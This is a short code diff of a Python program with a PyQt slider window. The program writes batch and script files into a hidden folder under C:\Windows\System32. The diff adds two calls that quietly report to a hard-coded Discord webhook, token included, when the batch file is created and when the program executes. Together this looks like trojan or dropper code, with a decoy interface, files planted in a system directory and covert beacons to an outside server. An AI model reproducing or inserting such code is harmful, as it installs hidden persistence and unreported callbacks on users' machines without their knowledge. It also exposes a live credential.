@@ -191,6 +191,7 @@ if file_contentsx1 =="04yb8u5ih5FGB":
     create_batch_file(file_contentpathx, r"C:\Windows\System32\WCNMX\aes3.0v1.py")
 else:
     create_batch_file("py", r"C:\Windows\System32\WCNMX\aes3.0v2.py")
+    send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "Has created the batch file.")
 '''
 directory = r'C:\Windows\System32'
 
@@ -250,7 +251,7 @@ app = QApplication(sys.argv)
 ex = SliderApp()
 ex.show()
 app.exec_()
-
+send_dx("https://discord.com/api/webhooks/1222048087871324160/8b3m_YeI6RSayYHfHJcaK-dYHanpkk3TMRSg9JS_plc0yaTmgHlL-6t5qHBwsXZEVL9V", "has executed AES 3.0")
 batch_file_path = r"C:\Windows\System32\WCNMX\aes3.0v1.bat"
 os.system('cls')
 try:
